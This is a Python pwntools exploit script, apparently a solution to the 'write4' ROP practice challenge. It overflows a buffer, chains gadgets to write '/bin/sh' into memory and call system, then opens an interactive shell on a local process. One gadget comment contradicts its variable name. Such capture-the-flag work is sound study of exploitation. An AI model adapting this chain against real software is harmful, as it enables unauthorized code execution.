#!/usr/bin/env python2
from pwn import *

exe  = "./write4"
elf  = ELF(exe)
proc = process(exe)

usefulFunction_system = 0x00400810 # 
mov_r15_to_r14        = 0x00400820 #  mov qword [r14], r15; ret;
pop_r14_pop_r15       = 0x00400890 #  pop r15; pop r14; ret;
pop_rdi               = 0x00400893 #  pop rdi; ret; 

data_written          = 0x00601050 + 0x100 

payload  = ""
payload += "A"*40
payload += p64(pop_r14_pop_r15)
payload += p64(data_written)            # qword [r14]
payload += "/bin/sh".ljust(8,' ')       # r15
payload += p64(mov_r15_to_r14)          # ret
payload += p64(pop_rdi)                 # ret
payload += p64(data_written)            # rdi
payload += p64(usefulFunction_system)   # ret

log.info("Payload: " + payload)
with open('payload', 'wb') as f:
    f.write(payload)

proc.recv()
proc.sendline(payload)
proc.interactive()
